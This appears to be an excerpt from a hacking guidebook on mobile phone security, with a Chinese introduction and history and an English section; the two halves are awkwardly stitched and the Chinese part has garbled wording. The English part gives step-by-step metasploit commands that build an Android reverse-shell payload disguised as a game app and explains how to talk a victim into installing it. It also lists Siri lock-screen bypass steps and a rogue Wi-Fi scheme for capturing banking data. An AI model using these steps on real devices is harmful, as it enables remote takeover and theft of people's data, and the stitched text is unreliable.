    \n# 引言\n\n感谢下载《黑客大学：大二版》这本书。如果你正在阅读这本书，要么你已经完成了《黑客大学：大一版》，要么你认为自己已经具备开始第 2 级所需的破解技能。这本电子书是通过各种练习和学习建立你破解技能的终极指南。\n\
    \n正如在前一书中解释的，破解并不是一种恶意活动。破解是探索我们周围的技术，并在过程中寻找乐趣。本书的演示将主要关注“解锁”或“越狱”各种设备，这在任何情况下都不违法。然而，对软件和硬件进行非预期的服务或更改可能会导致你拥有的任何保修失效。请自担风险，我们对你造成的损害不承担责任。但是，如果你想对拥有的手机和游戏机获得真正的控制权，请继续阅读查看顶级黑客如何运用他们的技艺。\n\
    \n# 手机破解的历史\n\n手机破解也称为 Phreaking（电话破解），它有一个独特的历史，可以追溯到 20 世纪 50 代。第一本书详细讨论了 Phreaking，因此在这里仅简要回顾。在电话公司从人工接线员变为自动交换机后，一群专门的实验“电话破解者”发现了可以“破解”交换机的精确频率和音调。这种行为变成了一种个人爱好和文化，这些人可以免费拨打长途电话或窃听电话线路。当固电话变得复杂而手机取代一切时，Phreaking\
    \ 消失了并被计算机破解所取代。\n\n第一批手机黑客简单地猜测语音信箱的密码，因为手机用户很少更改默认 PIN 码。使用像“0000”或“1234”这样简单的数字作为密码，黑客可以轻松地访问语音信箱并收听任何信息。\n\
    \n另一种被称为[欺骗](http://www.spooftel.com/freecall/) 的技术允许攻击者更改来电 ID 上显示的号码。通过冒充另一个号码，可以使用各种具有社会工程可能性的各种攻击策略。\n\
    \n随着翻盖手机的出现，移动设备变得更小、更高效。虽然一些专门的黑客可以在被盗的手机上刷入新的 ROM，或使用复杂的设备读取短信，但早期的手机并没有太多敏感数据可以窃取。直到手机变得更加先进并与我们的在线生活永久联系在一起，手机破解才成为一个利润丰厚的领域。\n\
    \n随着 2000 年代初的黑色手机和 2000 年代后期的 iPhone 将移动技术提升到与个人电脑相当，我们的更多信息可以从口袋中获取。安全往往为了自由和易用性而被牺牲，因此黑客能够相当容易地利用移动技术的弱点。\n\
    \n黑客是如何进入我们口袋里的微型电脑的？主要通过与黑客用来破解普通桌面 PC 相同的技术——软件漏洞、缺陷、社会工程学和密码攻击。\n\n大多数手机破解都是低级故事，关于名人的私人照片被盗或情情信息泄露。通常这些攻击和破解的发生是因为名人的技术无知以及他们欠佳的安全习惯。然而，每隔一段时间，聚光灯会关注一些重大事件，例如希拉里·克林顿的电子邮件服务器泄露，或者爱德华·斯诺登披露的机密政府信息。这些事件说明了安全在数字生活的各个方面是多么关重要，一个人的手机不应该是导致他们遭受黑客攻击的设备。\n\
    \n"
- fmt: '

    Perhaps the most widely discussed phone hack in recent news would be the San Bernardino
    terrorist attack of 2015 and the resulting investigation. After a couple killed
    16 and injured 24 more in the California town, both assailants were killed in
    the aftermath and an investigation began of the two’s background. Farook, one
    of the shooters, had a county-issued `iPhone 5C` that investigators believed would
    contain additional evidence surrounding the attacks. Additionally, having access
    to the device would mean that the FBI could investigate any communications into
    and out of the phone, possibly revealing any active terrorist groups or influences.


    However, the `iPhone` was password protected and up to date with `iOS`’s advanced
    security features that guaranteed the government could not access the contents
    of the phone. The NSA, FBI, and other government groups could not break the protection,
    so they demanded Apple provide a backdoor in `iOS` for the FBI to access data.
    Apple refused, stating such a backdoor would provide hackers, viruses, and malware
    a vector through which to target all `iOS` devices indiscriminately.


    Tensions ramped up between the FBI and Apple, but Apple stood its ground long
    enough for the government to seek help elsewhere. Finally on March 28th, 2016,
    the phone was cracked by 3rd party group of hackers for a million US dollars.
    How the group successfully broke the unbreakable is not fully known, but it is
    believed that a zero-day vulnerability (a vulnerability that nobody knew about)
    was used to gain access to the `iOS`.


    The whole scenario showed that the government is not above civilian privacy- they
    will use all resources at their disposal to gain access to our devices. While
    most agree that the phone needed to be unlocked as a matter of national security,
    it still holds true that if Apple were to comply with the government than groups
    like the NSA and FBI would have direct links to all `iOS` devices and their data
    (a clear breach of trust). Mobile phone security will continue to be a hot issue
    in the coming years, so learning how to protect yourself by studying how hackers
    think will save you in the long run.


    # Security Flaws in Mobile Devices


    Mobile devices including phones and laptops are especially vulnerable to the common
    IT problems. However the portability of the handy devices only amplifies the variety
    of attack vectors. Wi-Fi points often exist in coffee shops, public eateries,
    and libraries. Free and open Wi-Fi is always helpful, except they open up mobile
    devices to data interception and “man-in-the-middle” attacks.


    For example, say a hacker creates a public Wi-Fi point. By naming it something
    inconspicuous such as “Starbucks free Wi-Fi”, people will be sure to connect with
    their phones and laptops. At this point, the hacker has installed `Kali Linux`
    (refer to “Freshman Edition” for more info) and also connected to the compromised
    internet. They run a packet capture program and steal online banking information
    in real time while the victims thinks nothing is wrong. Security minded individuals
    should always remember that open Wi-Fi hotspots are dangerous, and they should
    only ever be connected to for simple browsing or with a VPN running.


    Social engineering plays a large part in mobile hacking as well. Phone users usually
    forget that phones can get viruses and malware just as PCs can, so the user is
    often off-guard and willing to click links and download Trojan horses when browsing
    from their phone. The following demonstration (courtesy of `http://wonderhowto.com`)
    takes advantage of an `Android` device on the same network (we’re in a Starbucks)
    and gives control to the hacker.


    1. Start a laptop with `Kali Linux` and the `metasploit` application installed.

    2. Find out your IP address with `ifconfig` in a terminal.

    3. Type this command- `msfpayload android/meterpreter/reverse_tcp LHOST=(your
    IP) LPORT=8080 R > ~/Desktop/starbucksgames.apk` which will create an application
    on the desktop that contains the exploit.

    4. Type `msfconsole` to start metasploit’s console.

    5. In the new console, type `use exploit/multi/handler`

    6. Then type `set payload android/meterpreter/reverse_tcp`

    7. `set lhost (Your IP)`

    8. `set lport 8080`

    9. Now you’ll need to deliver the exploit to your victim. You could come up to
    them and ask “hey, have you tried Starbuck’s free game app for Android? It’s pretty
    fun”. With their permission, you could email them the application. When they download
    and start it on their phone, return to your laptop and type `exploit` into the
    metasploit console. The two devices will communicate and you will be given control
    over parts of the phone.


    The lesson learned is to never install any app that seems strange or comes from
    an irreputable source. Later in the book, especially when talking about jailbreaking
    and rooting, we will install lots of “unverified” applications. Ultimately there
    is no real way to know if we are installing a legitimate app or a Trojan horse
    like above. When it comes to unofficial applications, you must trust your security
    instincts and only install from trusted sources.


    ## Heartbleed

    `Heartbleed` is a famous 2014 `OpenSSL` bug that affected half a million web servers
    and also hit nearly 50 million `Android` devices. The vulnerability allowed hackers
    to read data stored in memory such as passwords, encryption keys, and usernames
    by overflowing the buffer of `TLS` encryption. So massive was the impact that
    devices everywhere needed emergency patches to protect themselves. `OpenSSL` resolved
    the vulnerability as quickly as possible, and `Android` vendors issued an update
    that patched the problem.


    ## QuadRooter

    `QuadRooter` is an emerging vulnerability detected in `Qualcomm` chipsets for
    `Android` devices. Through a disguised malicious app, a hacker can gain all device
    permissions without even requesting them. Currently it is estimated that 900 million
    `Android` devices are vulnerable and at the time of writing not all carriers have
    released patches to remedy the issue. Staying safe from `QuadRooter` means updating
    as soon as patches are released and to refrain from installing suspicious applications.


    ## iOS Vulnerabilities

    Not just `Android` is affected by hackers, for the `iPhone 6` and `6S` running
    `iOS9` versions under 9.3.1 can have their pictures rifled through even if there
    is a passcode or fingerprint enabled. Here is the process. Follow along to see
    if your phone is vulnerable.


    1. Hold the home button to start `Siri`.

    2. Say “Search twitter”.

    3. `Siri` will ask what to search for, respond with “@yahoo.com”, “@att.net”,
    “@gmail.com”, or any other email suffix.

    4. `Siri` will display relevant results, so find a full email address among them.
    Press firmly on the address (3D touch) and then press “add new contact”.

    5. By then “adding a photo” to our new “contact”, we have access to the entire
    picture library.


    This is reminiscent of an earlier `iOS9` bug that could totally unlock a phone
    without a passcode. You can do this hack on unupdated `iOS9`.


    1. Hold the home button to start `Siri`.

    2. Say “remind me”.

    3. Say anything.

    4. Click on the reminder that `Siri` creates.

    5. Reminders will launch, long press the one you just created and click “share”.

    6. Tap the messages app.

    7. Enter any name, then tap on the name to create a new contact.

    8. Tap choose photo, and you can then press the home button to go to the home
    screen while unlocked.


    Most vulnerabilities such as the two mentioned are patched almost as soon as they
    are discovered, which is why they will not work on an updated `iOS9`.


    Finally, there is one final tactic that a hacker can use to break into a phone
    if they have physical possession of it. If a hacker really wants to gain access
    to a mobile device, they can do so at the cost of deleting all data. Through a
    factory reset, a hacker will erase absolutely everything on the device including
    the password and encryption, but they will be able to use the device or sell it
    to somebody else.

    '
